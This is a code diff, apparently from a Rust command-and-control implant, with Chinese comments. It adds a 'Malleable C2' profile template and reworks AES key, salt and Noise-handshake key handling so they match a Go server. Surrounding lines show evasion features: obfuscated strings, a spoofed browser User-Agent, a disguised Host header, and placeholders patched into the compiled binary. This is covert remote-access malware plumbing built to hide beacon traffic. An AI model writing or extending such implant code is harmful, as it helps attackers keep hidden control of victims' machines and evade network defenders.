@@ -61,14 +61,14 @@ pub static UA_TEMPLATE: [u8; 128] = *b"Mozilla/5.0 (Windows NT 10.0; Win64; x64)
 #[used]
 pub static HOST_TEMPLATE: [u8; 64] = *b"SYSTEM_CONFIG_DATA_HOST_MAPPING_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";
 
+/// Malleable C2 Profile 名称模板 (32 字节)
+#[used]
+pub static PROFILE_TEMPLATE: [u8; 32] = *b"C2_PROFILE_PLACEHOLDER_XXXXXXXXX";
+
 /// 默认调试服务器地址
 pub fn get_default_debug_url() -> String {
     crate::utils::decode_obf(&crate::obf_str!("ws://127.0.0.1:8080/ws"))
 }
-
-/// 默认调试 AES 密钥（仅 debug 构建使用；release 未 patch 时返回空密钥）
-#[cfg(debug_assertions)]
-const DEFAULT_DEBUG_KEY: &[u8; 32] = b"DEBUG_KEY_32_BYTES_FOR_DEV_ONLY!";
 
 /// 默认心跳间隔（秒）
 const DEFAULT_HEARTBEAT_INTERVAL: u64 = 10;
@@ -135,14 +135,13 @@ pub fn validate_server_url(url: &str) -> bool {
         || url.starts_with("bind://")
 }
 
-/// 获取 AES 加密密钥
-pub fn get_aes_key() -> Vec<u8> {
+/// 获取 **原始** AES 材料（未做 salt KDF）— 仅用于 Noise 握手 PSK，与服务端 `resolveAESKey` 对齐。
+pub fn get_aes_key_base() -> Vec<u8> {
     let mut base_key = vec![];
 
-    // 1. 检查源码静态修补 (针对源码编译模式)
+    // 1. 源码静态修补
     if AES_KEY != "REPLACE_ME_AES_KEY" && !AES_KEY.is_empty() {
         let key_str = AES_KEY.trim();
-        // 尝试解析 64 位 Hex
         if key_str.len() == 64 {
             if let Ok(decoded) = hex::decode(key_str) {
                 base_key = decoded;
@@ -151,40 +150,45 @@ pub fn get_aes_key() -> Vec<u8> {
         if base_key.is_empty() {
             base_key = key_str.as_bytes().to_vec();
         }
-        debug!("[+] Loaded key from source static patch (len: {})", base_key.len());
+        debug!("[+] Loaded base key from source static patch (len: {})", base_key.len());
     }
 
-    // 2. 检查二进制动态修补 (针对 Patch 模式)
+    // 2. 二进制动态修补
     if base_key.is_empty() {
         let placeholder_check = String::from_utf8_lossy(&AES_KEY_TEMPLATE);
         if !placeholder_check.contains("DATA_ENCRYPT") {
             base_key = AES_KEY_TEMPLATE.to_vec();
-            debug!("[+] Loaded key from binary dynamic patch (len: {})", base_key.len());
+            debug!("[+] Loaded base key from binary dynamic patch (len: {})", base_key.len());
         }
     }
 
-    // 3. 本地调试默认值 (仅 debug 构建)
     if base_key.is_empty() {
         #[cfg(debug_assertions)]
-        {
-            debug!("[*] Using hardcoded debug AES key");
-            base_key = DEFAULT_DEBUG_KEY.to_vec();
-        }
-        #[cfg(not(debug_assertions))]
-        {
-            // Release without patch: empty key → encrypt/decrypt fail closed
-            return Vec::new();
-        }
-    }
-    
-    // 强制修整到 32 字节（AES-256 要求）
-    if base_key.len() > 32 {
-        base_key.truncate(32);
-    } else if base_key.len() < 32 && !base_key.is_empty() {
-        base_key.resize(32, 0x00);
+        debug!("[*] No AES base key configured");
+        return Vec::new();
     }
 
-    // 应用 Salt (如果有)
+    if base_key.len() < 32 {
+        #[cfg(debug_assertions)]
+        debug!(
+            "[!] AES base key too short ({} < 32), rejecting",
+            base_key.len()
+        );
+        return Vec::new();
+    }
+    if base_key.len() > 32 {
+        base_key.truncate(32);
+    }
+    base_key
+}
+
+/// 获取传输用 AES 密钥（base + salt KDF）。
+/// **注意**：有 Noise 会话时业务流量必须用 session key，不要用本函数。
+pub fn get_aes_key() -> Vec<u8> {
+    let base_key = get_aes_key_base();
+    if base_key.is_empty() {
+        return Vec::new();
+    }
     let salt = get_encryption_salt();
     crate::crypto::derive_key(&base_key, &salt)
 }
@@ -268,6 +272,23 @@ pub fn get_ua() -> String {
         .to_string()
 }
 
+/// 获取 Malleable C2 Profile 名称
+/// 如果未 patch 或为空，返回 "default"
+pub fn get_profile_name() -> String {
+    let template_str = String::from_utf8_lossy(&PROFILE_TEMPLATE);
+    let name = template_str
+        .trim_matches('\0')
+        .trim_matches('X')
+        .trim_matches('_')
+        .trim()
+        .to_string();
+    if name.is_empty() || name.contains("PLACEHOLDER") {
+        "default".to_string()
+    } else {
+        name
+    }
+}
+
 /// 获取伪装 Host Header
 pub fn get_host_header() -> Option<String> {
     let template_str = String::from_utf8_lossy(&HOST_TEMPLATE);
@@ -311,14 +332,21 @@ pub fn get_dns_resolver() -> Option<String> {
     Some(resolver)
 }
 
-/// 获取加密盐 (32 字节)
+/// 获取加密盐 (32 字节)，与服务端 `make([]byte,32); copy(salt, listener.EncryptionSalt)` 对齐。
+///
+/// **禁止**在运行时生成随机盐：Noise 握手只用 base AES 作 PSK，流量仍可通，但
+/// `get_aes_key()` / 模块 HMAC 会与服务端永久不一致 → `HMAC verify failed`。
+/// 未配置或空盐时使用 32 字节全零（与 Go 空 salt 行为一致）。
 pub fn get_encryption_salt() -> Vec<u8> {
     // 1. 源码静态替换
     if ENCRYPTION_SALT != "REPLACE_ME_SALT" {
         let salt_clean = ENCRYPTION_SALT.trim().trim_matches('\0').trim_matches(char::from(0));
-        debug!("[+] Using statically replaced Salt: {}", salt_clean);
+        debug!("[+] Using statically replaced Salt (len {})", salt_clean.len());
         let mut salt_vec = salt_clean.as_bytes().to_vec();
         salt_vec.resize(32, 0);
+        if salt_vec.iter().all(|&b| b == 0) {
+            debug!("[!] salt is all zeros (empty config) — matching server empty-salt path");
+        }
         return salt_vec;
     }
 
@@ -328,8 +356,9 @@ pub fn get_encryption_salt() -> Vec<u8> {
         debug!("[+] Using dynamically patched Salt (32 bytes)");
         return ENCRYPTION_SALT_TEMPLATE.to_vec();
     }
-    
-    // 默认回退 32 字节零，使其在 DeriveKey 期间行为与服务端的 `make([]byte, 32)` 一致
+
+    // 3. 未 patch：全零盐（禁止随机 — 否则模块推送 HMAC 必挂）
+    debug!("[*] No salt configured — using 32 zero bytes (server-compatible)");
     vec![0u8; 32]
 }
 
